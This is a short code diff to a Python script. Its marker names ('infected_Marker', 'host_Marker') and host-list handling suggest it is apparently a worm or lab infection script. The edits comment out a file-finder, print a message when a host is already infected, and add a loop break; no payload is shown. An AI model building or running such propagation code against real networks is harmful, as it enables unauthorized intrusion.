@@ -146,14 +146,14 @@ def thisIP(interface):
 
 #find_file
 
-def TGT_file(fname):
-  dir_path = os.path.dirname(os.path.realpath(__file__))
+# def TGT_file(fname):
+#   dir_path = os.path.dirname(os.path.realpath(__file__))
   
-  for root, dirs, files in os.walk(dir_path):
-    for file in files:
-      if file.endswith('.txt'):
-        return (root+'/'+str(fname))
-  return None
+#   for root, dirs, files in os.walk(dir_path):
+#     for file in files:
+#       if file.endswith('.txt'):
+#         return (root+'/'+str(fname))
+#   return None
 
 #file retrieval 
 
@@ -164,7 +164,8 @@ def main():
   if len(sys.argv) < 2 and not os.path.exists(host_Marker):
 
     if os.path.exists(infected_Marker):
-        sys.exit()
+      print(comp_Msg)
+      sys.exit()
 
 
     try:
@@ -190,6 +191,7 @@ def main():
     for ip in networkHosts:
       if ip == ip_addr:
         networkHosts.remove(ip)
+        break
       else:
         continue
 
